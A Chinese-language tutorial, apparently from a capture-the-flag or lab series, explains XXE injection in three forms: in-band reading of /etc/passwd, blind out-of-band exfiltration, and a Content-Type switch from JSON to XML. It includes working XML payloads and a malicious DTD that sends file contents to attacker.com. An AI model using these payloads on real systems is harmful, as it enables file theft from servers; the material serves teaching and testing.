# XXE外部实体注入 — 漏洞原理

## 什么是XXE？

XXE（XML External Entity Injection，XML外部实体注入）是指攻击者通过在XML文档中定义外部实体，使XML解析器在解析时访问外部资源（如本地文件、内网服务等），从而读取敏感数据或发起内网请求。

XXE的核心问题：**XML解析器启用了外部实体解析功能，且未对用户提交的XML内容进行安全限制。**

---

## 一、有回显XXE（经典文件读取）

### 漏洞成因

当XML解析器配置为允许外部实体时，攻击者可以在XML中声明一个指向本地文件的实体，解析后实体的内容会替换到XML文档中被返回。

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

解析后 `&xxe;` 会被替换为 `/etc/passwd` 的内容，如果响应中回显了该字段，攻击者即可读取任意文件。

### 风险等级

| 维度 | 评级 |
|------|------|
| 攻击难度 | 低（Payload固定，易于构造） |
| 影响范围 | 高（可读取服务器任意文件） |
| 利用条件 | 需要一个接受XML输入的接口 |

---

## 二、Blind XXE（无回显OOB外带）

### 漏洞成因

当XML解析结果不回显到响应中时，攻击者无法直接看到实体内容。此时可以使用OOB（Out-of-Band）外带技术：将实体内容作为URL参数发送到攻击者控制的服务器。

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///flag/xxe-level2">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>validate</root>
```

攻击者服务器的DTD文件：
```xml
<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
%send;
```

### 风险等级

| 维度 | 评级 |
|------|------|
| 攻击难度 | 高（需要搭建外部服务器，构造DTD） |
| 影响范围 | 高（同样可读取任意文件） |
| 利用条件 | 服务器可访问外网 |

---

## 三、Content-Type切换XXE

### 漏洞成因

某些接口同时支持JSON和XML两种Content-Type，前端只使用JSON，但后端也接受XML。如果XML解析路径存在XXE漏洞，攻击者只需将Content-Type从 `application/json` 改为 `application/xml`，并提交恶意XML即可触发漏洞。

开发者可能只对JSON路径做安全测试，忽略了XML路径，导致"隐式"XXE漏洞。

### 风险等级

| 维度 | 评级 |
|------|------|
| 攻击难度 | 中（需要发现隐藏的XML支持） |
| 影响范围 | 高（与其他XXE相同） |
| 利用条件 | 接口同时支持JSON和XML |
